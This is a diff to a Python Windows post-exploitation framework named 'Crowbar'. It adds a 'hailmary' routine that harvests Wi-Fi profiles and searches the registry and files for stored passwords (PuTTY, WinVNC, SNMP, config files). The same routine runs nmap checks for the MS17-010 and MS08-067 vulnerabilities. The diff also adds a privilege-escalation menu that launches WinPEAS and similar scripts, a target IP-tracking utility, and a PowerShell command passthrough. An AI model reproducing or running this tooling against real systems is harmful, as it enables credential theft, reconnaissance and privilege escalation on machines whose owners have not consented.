@@ -13,6 +13,7 @@ import platform
 import psutil
 import requests
 import subprocess
+import pyautogui
 from datetime import datetime
 from getmac import get_mac_address
 
@@ -21,13 +22,8 @@ os.system("cls")
 ctypes.windll.kernel32.SetConsoleTitleW("[Crowbar Framework]")
 beginmen = socket.gethostname()
 
-def generator():
-    os.system("cls")
-    print("being worked on")
-
-def generatordir():
-    os.system("cls")
-    print("being worked on")
+ipurl = requests.get("https://ipv4bot.whatismyipaddress.com/").text
+iptrack = requests.get("https://vpnapi.io/api/").text
 
 # registry scanners from the old crowbar i made
 
@@ -109,6 +105,7 @@ boottime = datetime.fromtimestamp(psutil.boot_time())
 def leavescripts():
     scripts()
 
+# credit to https://github.com/d4vinci for some of the powershell scripts
 
 def scripts():
     print(''' 
@@ -125,6 +122,7 @@ def scripts():
             | help - Prints out help commands.                                                                                                           |
             | list - Lists all the scripts.                                                                                                              |
             | use (script number) - Selects and loads specified utility. Example: use 1                                                                  |
+            | hailmary - Runs all scripts against the target. [Not Recommended]                                                                          |
             | clear - Clears the screen.                                                                                                                 |
             | back - Goes back to the Crowbar menu.                                                                                                      |
             +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+            
@@ -166,6 +164,69 @@ def scripts():
             ''')
         elif scripts == "clear":
             os.system("cls")
+        elif scripts == "hailmary":
+            os.system("Netsh WLAN show profiles")
+            print(f''' 
+            +——— Basic System Information ———————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            | Machine: {machine1}                                                                                                                             |
+            | Version: {version1}                                                                                                                        |
+            | Platform: {platform1}                                                                                                        |
+            | System: {system1}                                                                                                                            |
+            | Computer Name: {computername}                                                                                                             |
+            | Local IP: {localipaddress}                                                                                                                     |
+            | Last Boot Time: {boottime}                                                                                                 |
+            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            ''')
+            print(''' 
+            Information from SOFTWARE\Microsoft\Windows NT\CurrentVersion
+            ———————————————————————————————————————————————————————————————''')
+            reg()
+            print(''' 
+            Information from \Environment
+            ———————————————————————————————————————————————————————————————''')
+            reg1()
+            print(''' 
+            Information from HKEY_CURRENT_USER\Volatile Environment
+            ———————————————————————————————————————————————————————————————''')
+            reg2()
+            print(''' 
+            Information from HARDWARE\DESCRIPTION\SYSTEM
+            ———————————————————————————————————————————————————————————————''')
+            reg3()
+            print(''' 
+            Information from SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform
+            ———————————————————————————————————————————————————————————————''')
+            reg4()
+            os.system("nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 {}".format(localipaddress))   
+            os.system("nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 {}".format(localipaddress))  
+            os.system("NET users")
+            os.system("netsh firewall show state & netsh firewall show config")   
+            os.system("reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'")    
+            os.system("findstr /si password *.xml *.ini *.txt *.config")    
+            os.system('''REG QUERY HKCU /F "password" /t REG_SZ /S /K''')
+            os.system('''reg query "HKCU\Software\ORL\WinVNC3\Password"''')
+            os.system('''reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"''')
+            os.system("reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run")
+            os.system("net share")
+            os.system("net localgroup")
+            os.system("wmic logicaldisk get caption,description,providername")
+            os.system("reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s")
+            os.system("whoami /priv")
+            os.system("wmic service list brief")
+            os.system("wmic qfe")
+            subprocess.call('''powershell.exe Get-Content scripts/unquoteservice.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''powershell.exe Get-Content scripts/routingtable.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''powershell.exe Get-Content scripts/listnetworkinter.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''powershell.exe Get-Content scripts/listprogramsreg.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''powershell.exe Get-Content scripts/listprogramsfol.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''powershell.exe Get-Content scripts/listarptables.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''powershell.exe Get-Content scripts/iisconfig.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''powershell.exe Get-Content scripts/sensitive_data_search.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            print(''' 
+            +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            | Hail mary finished!                                                                                                                        |
+            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            ''')
         elif scripts == "back":
             os.system("py main.py")
         elif scripts == "use 1":
@@ -806,12 +867,12 @@ def util():
         elif util == "list":
             print(''' 
             +——— Utilities —————————————————————————————————————————————————————————————————— Description ————————————————————————————————————————————————————+
-            | 1. util/generator                                                               A utility for creating extra malicious tools.                   |
-            | 2. util/extra/vmdetect                                                          A utility for VM Detection.                                     |
-            | 3. util/nmap [Nmap must be installed on target machine]                         Runs a port scan against the target.                            |
-            | 4. util/screencapture                                                           Takes a screenshot of the targets screen.                       |
-            | 5. util/extra/avtrigger [Golang must be installed on target machine]            Triggers targets AntiVirus [if enabled] with a video.           |
-            | 6. util/imonitor                                                                A utility for task monitoring.                                  |
+            | 1. util/extra/vmdetect                                                          A utility for VM Detection.                                     |
+            | 2. util/nmap [Nmap must be installed on target machine]                         Runs a port scan against the target.                            |
+            | 3. util/screencapture                                                           Takes a screenshot of the targets screen.                       |
+            | 4. util/extra/avtrigger [Golang must be installed on target machine]            Triggers targets AntiVirus [if enabled] with a video.           |
+            | 5. util/imonitor                                                                A utility for task monitoring.                                  |
+            | 6. util/ipv4                                                                    Grabs IPv4 of target machine.                                   |
             +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             ''')
         elif util == "clear":
@@ -819,8 +880,6 @@ def util():
         elif util == "back":
             os.system("py main.py")
         elif util == "use 1":
-            generator()
-        elif util == "use 2":
             print('''
             +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
             | Make sure you compile this into an EXE before                                                                                              |
@@ -828,7 +887,7 @@ def util():
             | Credits to: https://github.com/dehoisted                                                                                                   |
             +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+           
             ''')
-        elif util == "use 3":
+        elif util == "use 2":
             while True:
                 utilnmap = input("\nUtil (util/nmap)\n  |==> ")
                 if utilnmap == "help":
@@ -863,7 +922,7 @@ def util():
                     os.system("cls")
                 else:
                     print("Wrong Command!")
-        elif util == "use 4":
+        elif util == "use 3":
             while True:
                 utilss = input("\nUtil (util/screencapture)\n  |==> ")
                 if utilss == "help":
@@ -883,7 +942,7 @@ def util():
                     leaveutil()
                 else:
                     print("Wrong Command!")
-        elif util == "use 5":
+        elif util == "use 4":
             while True:
                 utilavtrig = input("\nUtil (util/extra/avtrigger)\n  |==> ")
                 if utilavtrig == "help":
@@ -906,7 +965,7 @@ def util():
                     os.system("cls")
                 elif utilavtrig == "back":
                     leaveutil()
-        elif util == "use 6":
+        elif util == "use 5":
             while True:
                 utilimonitor = input("\nUtil (util/imonitor)\n  |==> ")
                 if utilimonitor == "help":
@@ -940,7 +999,33 @@ def util():
                     os.system("schtasks")
                 else:
                     print("Wrong Command!")
-                    
+        elif util == "use 6":
+            while True:
+                utilipv4 = input("\nUtil (util/ipv4)\n  |==> ")
+                if utilipv4 == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           | 
+                    | ip - Gets the target machines IP address.                                                                                                  |
+                    | track - Tracks the target machines IP address.                                                                                             |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Util' directory.                                                                                                  |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
+                    ''')
+                elif utilipv4 == "ip":
+                    print(ipurl)
+                elif utilipv4 == "track":
+                    print(iptrack)
+                elif utilipv4 == "clear":
+                    os.system("cls")
+                elif utilipv4 == "back":
+                    leaveutil()
+                else:
+                    print("Wrong Command!")
+        else:
+            print("Wrong Command!")  
+
+
 def icommand():
     print(''' 
     +——— Help Commands for iCommand —————————————————————————————————————————————————————————————————————————————————————————————————————————————+
@@ -969,7 +1054,105 @@ def ipower():
             os.system("cls")
         elif ipower == "back":
             os.system("py main.py")
-        os.system("{}".format(ipower))    
+        os.system("powershell {}".format(ipower))    
+
+# credits to https://github.com/M4ximuss/ for the 'powerless' script
+# credits to https://github.com/carlospolop/ for the 'WinPEAS' script
+# credits to https://github.com/joshuaruppe/ for the 'winprivesc' script
+
+def leaveescalate():
+    escalate()
+
+def escalate():
+    while True:
+        escalate = input("\nEscalate (escalate/)\n  |==> ")
+        if escalate == "help":
+            print(''' 
+            +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            | help - Prints out help commands.                                                                                                           |
+            | list - Lists all the utilities.                                                                                                            |
+            | use (escalation script number) - Selects and loads specified method. Example: use 1                                                        |
+            | clear - Clears the screen.                                                                                                                 |
+            | back - Goes back to the Crowbar menu.                                                                                                      |
+            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+             
+            ''')
+        elif escalate == "list":
+            print(''' 
+            +——— Escalation Scripts ————————————————————————————————————————————————————————— Description ————————————————————————————————————————————————————+
+            | 1. escalate/winpeas                                                             WinPEAS searches for paths to escalate privileges Windows.      |
+            | 2. escalate/powerless                                                           A Windows privilege escalation script.                          |
+            | 3. escalate/winprivesc                                                          Script for Windows enumeration and privilege escalation routes. |
+            +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+            
+            ''')
+        elif escalate == "clear":
+            os.system("cls")
+        elif escalate == "back":
+            os.system("py main.py")
+        elif escalate == "use 1":
+            while True:
+                escalatewinpeas = input("\nEscalate (escalate/winpeas)\n  |==> ")
+                if escalatewinpeas == "help":
+                    print('''
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | scan - Starts scanning for paths to escalate privileges.                                                                                   |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Escalate' directory.                                                                                              |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif escalatewinpeas == "scan":
+                    os.system("cd escalate && winPEAS.bat")
+                    ctypes.windll.kernel32.SetConsoleTitleW("[Crowbar Framework]")
+                elif escalatewinpeas == "clear":
+                    os.system("cls")
+                elif escalatewinpeas == "back":
+                    leaveescalate()
+                else:
+                    print("Wrong Command!")
+        elif escalate == "use 2":
+            while True:
+                escalatepowerless = input("\nEscalate (escalate/powerless)\n  |==> ")
+                if escalatepowerless == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | scan - Starts scanning for paths to escalate privileges.                                                                                   |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Escalate' directory.                                                                                              |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif escalatepowerless == "scan":
+                    os.system("cd escalate && Powerless.bat")
+                elif escalatepowerless == "clear":
+                    os.system("cls")
+                elif escalatepowerless == "back":
+                    leaveescalate()
+                else:
+                    print("Wrong Command!")
+        elif escalate == "use 3":
+            while True:
+                escalatewinprivesc = input("\nEscalate (escalate/winprivesc)\n  |==> ")
+                if escalatewinprivesc == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Loads the script and the menus.                                                                                                      |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Escalate' directory.                                                                                              |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif escalatewinprivesc == "run":
+                    os.system("cd escalate && winprivesc.bat")
+                elif escalatewinprivesc == "clear":
+                    os.system("cls")
+                elif escalatewinprivesc == "back":
+                    leaveescalate()
+                else:
+                    print("Wrong Command!")
+        else:
+            print("Wrong Command!")
+
+
 
 def mainmenuinput():
     while True:
@@ -980,6 +1163,7 @@ def mainmenuinput():
             | help - Prints out help commands. (This is for the entire framework)                                                                        |
             | dir util - Goes into the 'Util' directory.                                                                                                 |   
             | dir scripts - Goes into the 'Scripts' directory.                                                                                           |
+            | dir escalate - Goes into the 'Escalate' directory.                                                                                         |
             | command - Loads the 'iCommand' tool for executing OS commands via CMD.                                                                     |
             | power - Loads the 'iPower' tool for executing OS commands via PowerShell.                                                                  |
             | crowbar - Reloads the framework.                                                                                                           |           
@@ -990,6 +1174,8 @@ def mainmenuinput():
             util()
         elif mainmenu == "dir scripts":
             scripts()
+        elif mainmenu == "dir escalate":
+            escalate()
         elif mainmenu == "command":
             icommand()
         elif mainmenu == "power":
@@ -1017,8 +1203,8 @@ print(f'''
 
 print(''' 
     +——— Crowbar ——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
-    | Version: 2.4                                                                                                                             |
-    | Scripts: 30                                                                                                                              |
+    | Version: 2.6                                                                                                                             |
+    | Scripts: 33                                                                                                                              |
     | Utilities: 6                                                                                                                             |
     | Made by: https://github.com/0x1CA3                                                                                                       |
     |                                                                                                                                          |
